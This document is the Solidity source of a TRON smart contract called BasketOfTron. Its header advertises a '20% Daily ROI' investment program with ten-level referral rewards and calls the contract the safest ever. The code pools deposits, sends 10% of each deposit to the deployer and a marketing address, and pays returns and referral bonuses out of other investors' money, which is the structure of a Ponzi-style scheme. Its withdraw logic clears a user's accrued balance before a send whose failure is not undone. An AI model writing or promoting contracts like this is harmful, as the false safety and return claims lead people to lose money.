//SourceUnit: BasketOfTron.sol

pragma solidity 0.5.8;

/**
* 
*                                                         
*                                                        
* BasketOfTron THE MOST SAFE AND STILL ATRACTIVE SMARTCONTRACT EVER
* 
* Crowdfunding And Investment Program: 20% Daily ROI. 
* 30% Referral Rewards 10 Levels
* 
* Tronoid 
* https://basketoftron.com
* 
* 
**/
contract BasketOfTron  {
  using SafeMath for uint;
  
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    mapping(uint => uint) referrals;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint MIN_DEPOSIT = 100 trx;
  uint START_AT = 25580485;
  // uint START_AT = 9994252;
  
  address payable public Dev;
  address payable public Marketing;

  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  mapping(address => bool) public lastReinvest;

  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          investors[rec].referrals[i]++;
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 1000;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
constructor(address payable _Marketing) public {
    Dev = msg.sender;
    Marketing = _Marketing;
    lastReinvest[Dev] = true;
    
    tariffs.push(Tariff(7 * 28800, 147));
    tariffs.push(Tariff(15 * 28800, 295));
    tariffs.push(Tariff(1 * 28800, 100));

    refRewards.push(100);
    refRewards.push(70);
    refRewards.push(50);
    refRewards.push(30);
    refRewards.push(20);
    refRewards.push(10);
    refRewards.push(5);
    refRewards.push(5);
    refRewards.push(5);
    refRewards.push(5);
  }
  
  function deposit(uint tariff, address referer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    
    register(referer);
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    
    Dev.transfer(msg.value.mul(6).div(100));
    Marketing.transfer(msg.value.mul(4).div(100));
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }

  function referrals(address user) public view returns(uint,uint,uint,uint,uint,uint,uint,uint,uint,uint) {
    Investor storage investor = investors[user];
    return (
      investor.referrals[0],
      investor.referrals[1],
      investor.referrals[2],
      investor.referrals[3],
      investor.referrals[4],
      investor.referrals[5],
      investor.referrals[6],
      investor.referrals[7],
      investor.referrals[8],
      investor.referrals[9]
    );
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;

  }
  
  function withdraw() external {
    uint amount = profit();
    if (msg.sender.send(amount)) {
      investors[msg.sender].withdrawn += amount;
      require (lastReinvest[msg.sender] == false);
        
      emit Withdraw(msg.sender, amount);
    }
  }

}

library SafeMath {

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

}